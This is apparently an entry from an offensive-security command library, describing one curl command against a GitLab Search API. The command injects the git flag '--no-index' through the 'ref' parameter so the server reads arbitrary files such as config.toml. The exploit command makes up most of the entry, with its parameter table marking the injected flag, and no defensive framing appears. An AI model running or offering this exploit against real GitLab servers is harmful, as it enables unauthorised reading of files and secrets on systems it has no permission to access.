---
data: >-
  curl --header "PRIVATE-TOKEN: $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index'
tags:
  - api
  - file-read
type: command
executor: bash
platforms:
  - Linux
id: 7c595a01-8514-4fe6-98a9-b1732cd547b7
created_at: '2025-12-11T06:10:29.194Z'
updated_at: '2025-12-11T06:10:29.194Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-search-blobs

## Command

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index'
```

## Description

Exploits blobs scope in Search API to read files via injected --no-index flag.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--header "PRIVATE-TOKEN: $TOKEN"` | Authentication | Yes |
| `scope=blobs` | Scope | Yes |
| `search=.` | Search term | Yes |
| `ref=--no-index` | Injected flag | Yes |

## Examples

### Basic Usage

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index'
```

## Expected Output

JSON with file contents like config.toml.

## Related

- [[procedures/Exploit-Blobs-Scope-for-File-Read]]
